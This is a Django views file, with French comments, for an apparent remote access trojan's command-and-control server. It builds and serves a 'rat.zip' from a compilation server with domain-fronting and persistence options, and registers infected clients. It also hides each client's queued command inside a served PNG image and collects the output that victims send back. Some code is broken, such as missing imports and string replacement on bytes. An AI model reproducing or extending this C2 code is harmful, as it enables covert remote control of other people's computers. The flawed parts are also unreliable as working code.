from django.shortcuts import render, redirect, get_object_or_404
from django.views.decorators.csrf import csrf_exempt
from django.http import HttpResponse, HttpResponseNotFound
import os
import sys
from datetime import datetime
import subprocess

"""
TODO:
1. form.cleaned_data
"""
def hash_djb2(s):
	"""
	Hash helper
	"""
	hash = 5381
	for x in s:
		hash = (( hash << 5) + hash) + ord(x) 

	return hash & 0xFFFFFFFF

def display_compilation_form(request):
	# if this is a POST request we need to process the form data
	if request.method == 'POST':
		# create a form instance and populate it with data from the request:
		
		"""
		form = RatForm(request.POST)
		print(form)
		if form.is_valid():
			print("form is valid")
			# process the data in form.cleaned_data as required
			id = form.cleaned_data['id']
			print("id is:", id)
			return render(request, 'compilation_form.html', {'form': form, 'id': id})
		"""
		
		compilation_server_url = 'http://'+request.POST.get('compilation_server', '')+'/compile/'
		cloudfront = request.POST.get('cloudfront', '')
		frontable = request.POST.get('frontable', '')
		persistent = request.POST.get('persistent', '')

		post_data = {'cloudfront':cloudfront, 'frontable':frontable, 'persistent':persistent}
		# Send form to compilation server
		try:
			r = requests.post(compilation_server_url, data=post_data)
			if r.status_code == 200:
				with open('/tmp/rat.zip', 'wb') as f:
					for chunk in r:
						f.write(chunk)
				with open('/tmp/rat.zip', 'rb') as f:
					response = HttpResponse(f.read(), content_type="application/zip")
					response['Content-Disposition'] = 'inline; filename= rat.zip' 
					return response
			else:
				return HttpResponse("There has been an error")
		except Exception as e:
			return HttpResponse(e)

	# if a GET (or any other method) we'll create a blank form
	else:
		"""
		print("get method")
		form = ClientForm()
		print(form)
		return render(request, 'compilation_form.html', {'form': form})
		"""
		return render(request, 'compilation_form.html')

# Authentication page for the client
@csrf_exempt
def auth(request):

	# Récupération des informations permettant d'identifier le client
	username = request.POST.get('username', 'default')
	if username == 'default':
		return HttpResponse('')
	
	# Création de l'identifiant du client via hash_djb2
	userId = str(hash_djb2(username))

	# Ajout d'un client à la BDD s'il n'existe pas
	if Client.objects.filter(id = userId).exists():
		return HttpResponse('')
	else:
		c = Client()
		c.id = userId
		c.info = username
		c.requestNature = '[NEW USER]'
		c.save()
		return HttpResponse('')


# Page contenant l'image avec la commande
@csrf_exempt
def display(request, client_id):
	
	client = get_object_or_404(Client, pk=client_id)
	client.lastRequest = datetime.now()
	client.requestNature ='[GET IMAGE]'
	client.save()

	# Récupération du de l'image de base
	my_dir = os.path.dirname(__file__)
	imagePath = os.path.join(my_dir, 'image/atom.png')

	with open(imagePath, "rb") as imageFile:
		imageData = imageFile.read()

	# Ajout de la commande et du temps de polling
	imageData = imageData.replace("command",client.command+'xXx')
	imageData = imageData.replace("time", client.polling+'tTt')

	return HttpResponse(imageData, content_type="image/png")


# Page où un client envoie le résultat des commandes
@csrf_exempt
def results(request, client_id):

	# Récupération du résultat de la commande
	result = request.POST.get('output', 'default')
	if result == 'default':
		return HttpResponse('')

	# Actualisation du client dans la BDD
	client = get_object_or_404(Client, pk=client_id)

	client.output = 'Date : ' \
					+ str(datetime.now().replace(microsecond=0)) \
					+ '\n' \
					+ '%' \
					+ client.command \
					+'\n-----------------------------\n' \
					+ result
	# When command return, flushes the command
	client.command =""
	client.requestNature='[POST RESULTS]'
	client.save()

	return HttpResponse(result)
